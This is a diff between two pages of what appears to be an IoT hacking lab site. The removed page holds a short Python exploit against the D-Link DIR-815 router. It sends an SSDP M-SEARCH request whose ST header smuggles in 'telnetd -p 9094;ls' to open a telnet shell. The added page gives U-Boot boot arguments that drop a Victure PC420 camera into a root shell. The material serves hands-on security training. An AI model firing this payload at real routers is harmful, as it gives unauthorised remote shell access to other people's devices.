@@ -5,7 +5,7 @@
 <meta name=generator content="Hugo 0.88.1">
 <meta name=description content>
 <link rel=icon href=/images/favicon.png type=image/png>
-<title>OS Command Injection II :: IoT Hack Labs</title>
+<title>Test Remote Connection :: IoT Hack Labs</title>
 <link href=/css/nucleus.css?1634851016 rel=stylesheet>
 <link href=/css/fontawesome-all.min.css?1634851016 rel=stylesheet>
 <link href=/css/hybrid.css?1634851016 rel=stylesheet>
@@ -20,7 +20,7 @@
 <script src=/js/jquery-3.3.1.min.js?1634851016></script>
 <style>:root #header+#content>#left>#rlblock_left{display:none!important}</style>
 </head>
-<body data-url=/router-lab/dir-815/os-command-injection-ii/>
+<body data-url=/victure-pc420/10-reset/>
 <nav id=sidebar>
 <div id=header-wrapper>
 <div id=header>
@@ -44,7 +44,8 @@
 </section>
 <div class=highlightable>
 <ul class=topics>
-<li data-nav-id=/victure-pc420/ title="Victure PC420" class=dd-item>
+<li data-nav-id=/victure-pc420/ title="Victure PC420" class="dd-item
+parent">
 <a href=/victure-pc420/>
 Victure PC420
 </a>
@@ -96,21 +97,19 @@ Connect Camera to WiFi
 Test Remote Connection
 </a>
 </li>
-<li data-nav-id=/victure-pc420/10-reset/ title="Test Remote Connection" class=dd-item>
+<li data-nav-id=/victure-pc420/10-reset/ title="Test Remote Connection" class="dd-item active">
 <a href=/victure-pc420/10-reset/>
 Test Remote Connection
 </a>
 </li>
 </ul>
 </li>
-<li data-nav-id=/router-lab/ title="Router Lab" class="dd-item
-parent">
+<li data-nav-id=/router-lab/ title="Router Lab" class=dd-item>
 <a href=/router-lab/>
 Router Lab
 </a>
 <ul>
-<li data-nav-id=/router-lab/dir-815/ title=DIR-815 class="dd-item
-parent">
+<li data-nav-id=/router-lab/dir-815/ title=DIR-815 class=dd-item>
 <a href=/router-lab/dir-815/>
 DIR-815
 </a>
@@ -140,7 +139,7 @@ Discovery
 OS Command Injection I
 </a>
 </li>
-<li data-nav-id=/router-lab/dir-815/os-command-injection-ii/ title="OS Command Injection II" class="dd-item active">
+<li data-nav-id=/router-lab/dir-815/os-command-injection-ii/ title="OS Command Injection II" class=dd-item>
 <a href=/router-lab/dir-815/os-command-injection-ii/>
 OS Command Injection II
 </a>
@@ -236,7 +235,7 @@ Ultraloq-UL3
 <div>
 <div id=top-bar>
 <div id=top-github-link>
-<a class=github-link title="Edit this page" href=https://github.com/Iot-hack-labs/iot-hack-labs.github.io/blob/main/content/Router%20Lab/DIR-815/OS-Command-Injection-II.md target=blank>
+<a class=github-link title="Edit this page" href=https://github.com/Iot-hack-labs/iot-hack-labs.github.io/blob/main/content/Victure%20PC420/10-reset.md target=blank>
 <i class="fas fa-code-branch"></i>
 <span id=top-github-link-text>Edit this page</span>
 </a>
@@ -249,16 +248,12 @@ Ultraloq-UL3
 </span>
 <span id=toc-menu><i class="fas fa-list-alt"></i></span>
 <span class=links>
-<a href=/></a> > <a href=/router-lab/>Router Lab</a> > <a href=/router-lab/dir-815/>DIR-815</a> > OS Command Injection II
+<a href=/></a> > <a href=/victure-pc420/>Victure PC420</a> > Test Remote Connection
 </span>
 </div>
 <div class=progress>
 <div class=wrapper>
-<nav id=TableOfContents>
-<ul>
-<li><a href=#os-command-injection-ii>OS Command Injection II</a></li>
-</ul>
-</nav>
+<nav id=TableOfContents></nav>
 </div>
 </div>
 </div>
@@ -267,30 +262,25 @@ Ultraloq-UL3
 </div>
 <div id=body-inner>
 <h1>
-OS Command Injection II
+Test Remote Connection
 </h1>
-<h2 id=os-command-injection-ii>OS Command Injection II</h2>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> socket
-<span style=color:#f92672>import</span> struct
-
-<span style=color:#75715e># This vulnerability is pretty much in every router that has cgibin and uses SSDP code in that cgibin. This one worked on the device dir-815. Will work only in WLAN</span>
-
-
-buf <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;M-SEARCH * HTTP/1.1</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>HOST:239.255.255.250:1900</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>ST:urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 9094;ls</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>MX:2</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>MAN:&#34;ssdp:discover&#34;</span><span style=color:#ae81ff>\r\n\r\n</span><span style=color:#e6db74>&#39;</span>
-
-print <span style=color:#e6db74>&#34;[+] sending buffer size&#34;</span>, len(buf)
-s <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_DGRAM)
-s<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#34;239.255.255.250&#34;</span>, <span style=color:#ae81ff>1900</span>))
-s<span style=color:#f92672>.</span>send(buf)
-s<span style=color:#f92672>.</span>close()
-</code></pre></div>
+<p>in uboot (press enter after rebooting)</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>setenv bootargs console<span style=color:#f92672>=</span>ttySAK0,115200n8 root<span style=color:#f92672>=</span>/dev/mtdblock4 rootfstype<span style=color:#f92672>=</span>squashfs init<span style=color:#f92672>=</span>/bin/sh mem<span style=color:#f92672>=</span>64M memsize<span style=color:#f92672>=</span>64M
+saveenv
+</code></pre></div><p>reboot&mldr; wait for shell.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>mount /mnt <span style=color:#f92672>&amp;&amp;</span> mkdir /mnt/debug <span style=color:#f92672>&amp;&amp;</span> touch /mnt/debug/log.txt
+/etc/init.d/rcS
+</code></pre></div><p>in uboot (press enter after rebooting)</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>setenv bootargs console<span style=color:#f92672>=</span>ttySAK0,115200n8 root<span style=color:#f92672>=</span>/dev/mtdblock4 rootfstype<span style=color:#f92672>=</span>squashfs init<span style=color:#f92672>=</span>/init mem<span style=color:#f92672>=</span>64M memsize<span style=color:#f92672>=</span>64M
+saveenv
+</code></pre></div><p>reboot</p>
 <footer class=footline>
 </footer>
 </div>
 </div>
 <div id=navigation>
-<a class="nav nav-prev" href=/router-lab/dir-815/os-command-injection-i/ title="OS Command Injection I"> <i class="fa fa-chevron-left"></i></a>
-<a class="nav nav-next" href=/router-lab/dir-815/references/ title=References style=margin-right:0><i class="fa fa-chevron-right"></i></a>
+<a class="nav nav-prev" href=/victure-pc420/09-test-remote-connection/ title="Test Remote Connection"> <i class="fa fa-chevron-left"></i></a>
+<a class="nav nav-next" href=/router-lab/ title="Router Lab" style=margin-right:0><i class="fa fa-chevron-right"></i></a>
 </div>
 </section>
 <div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px>
